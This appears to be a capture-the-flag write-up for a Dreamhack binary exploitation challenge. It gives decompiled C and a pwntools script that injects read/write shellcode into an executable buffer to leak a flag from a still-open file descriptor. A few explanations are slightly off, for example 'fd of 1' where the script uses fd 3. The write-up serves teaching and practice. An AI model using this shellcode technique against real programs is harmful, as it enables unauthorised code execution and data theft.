# Write-up of the challenge "Password Forgot "

This challenge is part of the "Binary exploitation" category and is in **Level 2**.

# Goal of the challenge

The objective of this challenge is to use **read** and **write** to get the flag!

## Program structure

```c
int32_t main(int32_t argc, char** argv, char** envp)
{
    setvbuf(stdin, nullptr, 2, 0);
    setvbuf(__TMC_END__, nullptr, 2, 0);
    int64_t buf = mmap(nullptr, 0x1000, 7, 0x22, 0xffffffff, 0);
    puts("Steve, are you listening? I will send the password through system!");
    printf("Prepare your spell!\n> ");
    read(0, buf, 0x400);
    puts("**siren rangs** **siren rangs**");
    puts("Oh no!! Cops are coming!! I removed the evidence. Run steve, Run!");
    puts("Magic? Presto...Anyway!");
    sub_401357();
    buf();
    return 0;
}

int64_t sub_401357()
{
    void* fsbase;
    int64_t rax = *(fsbase + 0x28);
    FILE* rax_1 = fopen("flag.txt", "rt");
    int64_t var_78;
    __builtin_memset(&var_78, 0, 0x64);

    if (!rax_1)
        puts("[!] Flag file error. Send DM to rootsquare...");

    __isoc99_fscanf(rax_1, "%s", &var_78, &data_40211e);

    for (int32_t i = 0; i <= 0x63; i += 1)
        *(&var_78 + i) = 0;

    fseek(rax_1, 0, 0);
    int64_t var_80_1 = 0;
    prctl(0x16, 1);

    if (rax == *(fsbase + 0x28))
        return rax - *(fsbase + 0x28);

    __stack_chk_fail();
    /* no return */
}
```

## Security breach

Because of the **mmap**, we can provide a shell, because it is **Executable**:

```c
    int64_t buf = mmap(nullptr, 0x1000, 7, 0x22, 0xffffffff, 0);
```

Basic **bof**:

```c
read(0, buf, 0x400);
```

## Solution

At first as soon I saw the **mmap** I decided to try and spawn a shell using `shellcraft.sh()`, but it didn't work. After som anaylzing I found out the reason why it was because **seccomp** was enabled as we can see:

```c
prctl(0x16, 1);
```

So we need to understand the program. What it does it just **open** the **flag.txt**, clear it from memery but it leaves the **file open** because **fclose** is not called. So the idea hear is clear most of the time the **open** leaves **fd** of **1** so our goal is just to read from the stack and then write it out.

Solve.py:

```python
from pwn import *

# p = process('./main')
p = remote("host8.dreamhack.games", 9891)

context.arch = 'amd64'

pay = shellcraft.read(3, 'rsp', 0x100)
pay += shellcraft.write(1, 'rsp', 0x100)

p.sendline(asm(pay))

p.interactive()

```
